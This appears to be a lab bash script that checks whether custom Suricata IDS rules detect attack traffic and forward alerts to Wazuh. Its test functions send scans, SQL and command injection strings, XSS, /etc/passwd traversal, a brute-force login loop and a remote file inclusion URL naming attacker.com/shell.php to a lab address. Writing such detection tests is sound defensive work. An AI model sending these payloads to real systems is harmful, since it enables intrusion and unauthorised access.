#!/bin/bash

################################################################################
# Suricata Rules Testing Script - CyberLab Infrastructure
# Purpose: Automated testing of Suricata IDS/IPS rules
# Usage: ./test_suricata_rules.sh [test_category] [rule_id]
################################################################################

set -e

# Color codes for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Configuration
SURICATA_CONTAINER="suricata"
WAZUH_CONTAINER="wazuh.manager"
TARGET_HOST="10.10.10.10"
DNS_HOST="10.10.30.101"
LDAP_HOST="10.10.20.40"
LOG_FILE="/tmp/suricata_test_results.log"

################################################################################
# Helper Functions
################################################################################

log() {
  echo -e "${BLUE}[$(date '+%Y-%m-%d %H:%M:%S')]${NC} $1" | tee -a "$LOG_FILE"
}

success() {
  echo -e "${GREEN}✓ $1${NC}" | tee -a "$LOG_FILE"
}

error() {
  echo -e "${RED}✗ $1${NC}" | tee -a "$LOG_FILE"
}

warning() {
  echo -e "${YELLOW}⚠ $1${NC}" | tee -a "$LOG_FILE"
}

check_prerequisites() {
  log "Checking prerequisites..."

  if ! docker ps | grep -q "$SURICATA_CONTAINER"; then
    error "Suricata container not running!"
    exit 1
  fi
  success "Suricata container is running"

  if ! docker exec "$SURICATA_CONTAINER" test -f /var/log/suricata/eve.json; then
    error "Eve.json log file not found!"
    exit 1
  fi
  success "Eve.json log file exists"
}

monitor_alerts() {
  local rule_id=$1
  local wait_seconds=${2:-5}

  log "Monitoring alerts for rule ID: $rule_id (waiting $wait_seconds seconds)..."
  sleep "$wait_seconds"

  local alert_count=$(docker exec "$SURICATA_CONTAINER" \
    bash -c "jq -r \"select(.alert.signature_id==$rule_id)\" /var/log/suricata/eve.json 2>/dev/null | grep -c signature_id || echo 0")

  if [ "$alert_count" -gt 0 ]; then
    success "Detected $alert_count alert(s) for rule $rule_id"
    return 0
  else
    warning "No alerts detected for rule $rule_id (may need adjustment)"
    return 1
  fi
}

display_alert() {
  local rule_id=$1
  log "Alert details for rule $rule_id:"
  docker exec "$SURICATA_CONTAINER" bash -c "jq -r \"select(.alert.signature_id==$rule_id)\" /var/log/suricata/eve.json 2>/dev/null | tail -1 | jq ." || true
}

################################################################################
# Test Categories
################################################################################

test_reconnaissance() {
  log "=== RECONNAISSANCE & SCANNING TESTS (SID 1000001-1000010) ==="

  # Test 1: TCP Port Scan
  log "\n[Test 1.1] TCP Port Scan Detection (SID 1000001)"
  for port in 22 80 443 3306 5432 8080 9200 9300; do
    timeout 1 bash -c "echo '' > /dev/tcp/$TARGET_HOST/$port" 2>/dev/null || true
  done
  monitor_alerts 1000001 5

  # Test 2: ICMP Ping
  log "\n[Test 1.2] ICMP Ping Sweep Detection (SID 1000003)"
  for i in {1..10}; do
    ping -c 1 -W 1 10.10.10.10 2>/dev/null || true
  done
  monitor_alerts 1000003 5

  # Test 3: DNS Zone Transfer
  log "\n[Test 1.3] DNS Zone Transfer (SID 1000004)"
  dig @"$DNS_HOST" cyberlab.local AXFR 2>/dev/null || true
  monitor_alerts 1000004 5

  success "Reconnaissance tests completed"
}

test_sql_injection() {
  log "=== SQL INJECTION TESTS (SID 1000100-1000109) ==="

  # Test 1: SELECT Injection
  log "\n[Test 2.1] SQL SELECT Injection (SID 1000100)"
  curl -s "http://$TARGET_HOST/?id=1' OR SELECT 1--" || true
  monitor_alerts 1000100 3

  # Test 2: UNION-Based
  log "\n[Test 2.2] SQL UNION-Based Injection (SID 1000101)"
  curl -s "http://$TARGET_HOST/?id=1' UNION SELECT 1,2,3--" || true
  monitor_alerts 1000101 3

  # Test 3: Boolean-Based
  log "\n[Test 2.3] Boolean-Based Blind SQL (SID 1000102)"
  curl -s "http://$TARGET_HOST/?id=1' AND 1=1--" || true
  monitor_alerts 1000102 3

  # Test 4: Time-Based
  log "\n[Test 2.4] Time-Based Blind SQL (SID 1000103)"
  curl -s "http://$TARGET_HOST/?id=1' SLEEP(5)--" || true
  monitor_alerts 1000103 3

  success "SQL Injection tests completed"
}

test_command_injection() {
  log "=== COMMAND INJECTION & RCE TESTS (SID 1000200-1000209) ==="

  # Test 1: Pipe Operator
  log "\n[Test 3.1] Command Injection via Pipe (SID 1000200)"
  curl -s "http://$TARGET_HOST/?cmd=test | ls" || true
  monitor_alerts 1000200 3

  # Test 2: Backticks
  log "\n[Test 3.2] Command Injection via Backticks (SID 1000201)"
  curl -s "http://$TARGET_HOST/?cmd=\`whoami\`" || true
  monitor_alerts 1000201 3

  # Test 3: Command Substitution
  log "\n[Test 3.3] Command Injection via \$() (SID 1000202)"
  curl -s "http://$TARGET_HOST/?cmd=\$(whoami)" || true
  monitor_alerts 1000202 3

  # Test 4: Shell Invocation
  log "\n[Test 3.4] Shell Invocation /bin/bash (SID 1000203)"
  curl -s "http://$TARGET_HOST/?cmd=/bin/bash -c 'id'" || true
  monitor_alerts 1000203 3

  # Test 5: PHP eval
  log "\n[Test 3.5] PHP eval() Injection (SID 1000205)"
  curl -s "http://$TARGET_HOST/?code=eval(\"phpinfo()\")" || true
  monitor_alerts 1000205 3

  success "Command Injection tests completed"
}

test_authentication() {
  log "=== AUTHENTICATION ATTACK TESTS (SID 1000300-1000309) ==="

  # Test 1: HTTP Login Brute Force
  log "\n[Test 4.1] HTTP Login Brute Force (SID 1000303)"
  for i in {1..12}; do
    curl -s -X POST "http://$TARGET_HOST/admin/login.php" \
      -d "username=admin&password=attempt$i" || true &
  done
  wait
  monitor_alerts 1000303 5

  # Test 2: Weak Password
  log "\n[Test 4.2] Weak Password Detection (SID 1000306)"
  curl -s -X POST "http://$TARGET_HOST/auth/register" \
    -d "username=test&password=123456" || true
  monitor_alerts 1000306 3

  success "Authentication tests completed"
}

test_web_application() {
  log "=== WEB APPLICATION ATTACK TESTS (SID 1000600-1001107) ==="

  # Test 1: XSS
  log "\n[Test 5.1] XSS - Script Tag (SID 1000600)"
  curl -s "http://$TARGET_HOST/?search=<script>alert('XSS')</script>" || true
  monitor_alerts 1000600 3

  # Test 2: Path Traversal
  log "\n[Test 5.2] Path Traversal (SID 1001103)"
  curl -s "http://$TARGET_HOST/?file=../../../../etc/passwd" || true
  monitor_alerts 1001103 3

  # Test 3: LFI
  log "\n[Test 5.3] Local File Inclusion /etc/passwd (SID 1001104)"
  curl -s "http://$TARGET_HOST/?page=/etc/passwd" || true
  monitor_alerts 1001104 3

  # Test 4: RFI
  log "\n[Test 5.4] Remote File Inclusion (SID 1001105)"
  curl -s "http://$TARGET_HOST/?include=http://attacker.com/shell.php" || true
  monitor_alerts 1001105 3

  success "Web Application tests completed"
}

test_data_exfiltration() {
  log "=== DATA EXFILTRATION TESTS (SID 1001102-1001119) ==="

  # Test 1: FTP Anonymous
  log "\n[Test 6.1] FTP Anonymous Login (SID 1001102)"
  timeout 2 ftp -n "$TARGET_HOST" <<EOF 2>/dev/null || true
user anonymous anypass
quit
EOF
  monitor_alerts 1001102 3

  # Test 2: Ransomware Pattern
  log "\n[Test 6.2] Ransomware File Extension (SID 1001113)"
  curl -s "http://$TARGET_HOST/upload.php?file=document.encrypted" || true
  monitor_alerts 1001113 3

  # Test 3: DNS Tunneling
  log "\n[Test 6.3] DNS Query Anomaly (SID 1001112)"
  for i in {1..50}; do
    nslookup "data$i.exfil.cyberlab.local" "$DNS_HOST" 2>/dev/null &
  done
  wait
  monitor_alerts 1001112 5

  success "Data Exfiltration tests completed"
}

test_all() {
  log "=== RUNNING ALL SURICATA RULE TESTS ==="
  test_reconnaissance
  test_sql_injection
  test_command_injection
  test_authentication
  test_web_application
  test_data_exfiltration
  log "\n=== ALL TESTS COMPLETED ==="
}

################################################################################
# Verification Commands
################################################################################

verify_wazuh() {
  log "=== VERIFYING WAZUH INTEGRATION ==="

  log "Checking if Wazuh received Suricata alerts..."
  docker exec "$WAZUH_CONTAINER" bash -c \
    "grep -i 'suricata' /var/ossec/logs/alerts/alerts.json 2>/dev/null | tail -5" || \
    warning "No recent Suricata alerts in Wazuh"

  success "Wazuh verification completed"
}

show_recent_alerts() {
  local count=${1:-10}
  log "=== RECENT SURICATA ALERTS (Last $count) ==="
  docker exec "$SURICATA_CONTAINER" bash -c \
    "tail -$count /var/log/suricata/eve.json | jq -r '.alert.signature' 2>/dev/null" || \
    warning "Unable to retrieve recent alerts"
}

show_rule_stats() {
  log "=== RULE STATISTICS ==="
  docker exec "$SURICATA_CONTAINER" bash -c \
    "jq -r '.alert.signature_id' /var/log/suricata/eve.json 2>/dev/null | sort | uniq -c | sort -rn | head -20" || \
    warning "Unable to retrieve rule statistics"
}

################################################################################
# Main Menu
################################################################################

show_menu() {
  cat << EOF

${BLUE}========================================${NC}
${BLUE}Suricata Rules Testing Menu${NC}
${BLUE}========================================${NC}

Test Categories:
  1) Reconnaissance & Scanning (1000001-1000010)
  2) SQL Injection (1000100-1000109)
  3) Command Injection & RCE (1000200-1000209)
  4) Authentication Attacks (1000300-1000309)
  5) Web Application Attacks (1000600-1001107)
  6) Data Exfiltration (1001102-1001119)
  7) Run ALL Tests

Verification & Monitoring:
  8) Verify Wazuh Integration
  9) Show Recent Alerts
  10) Show Rule Statistics

  0) Exit

${YELLOW}Select an option (0-10):${NC}
EOF
}

################################################################################
# Main Execution
################################################################################

main() {
  # Initialize log file
  > "$LOG_FILE"

  log "Suricata Rules Testing Script Started"
  check_prerequisites

  # Check if argument provided
  if [ $# -eq 0 ]; then
    # Interactive menu
    while true; do
      show_menu
      read -r choice

      case $choice in
        1) test_reconnaissance ;;
        2) test_sql_injection ;;
        3) test_command_injection ;;
        4) test_authentication ;;
        5) test_web_application ;;
        6) test_data_exfiltration ;;
        7) test_all ;;
        8) verify_wazuh ;;
        9) show_recent_alerts ;;
        10) show_rule_stats ;;
        0) log "Exiting..."; exit 0 ;;
        *) error "Invalid option" ;;
      esac

      log "\nResults saved to: $LOG_FILE\n"
      read -p "Press Enter to continue..."
    done
  else
    # Command-line argument mode
    case "$1" in
      recon) test_reconnaissance ;;
      sqli) test_sql_injection ;;
      rce) test_command_injection ;;
      auth) test_authentication ;;
      web) test_web_application ;;
      exfil) test_data_exfiltration ;;
      all) test_all ;;
      verify) verify_wazuh ;;
      stats) show_rule_stats ;;
      *) echo "Usage: $0 [recon|sqli|rce|auth|web|exfil|all|verify|stats]"; exit 1 ;;
    esac
  fi

  log "Test execution completed. Results: $LOG_FILE"
}

# Execute main function
main "$@"
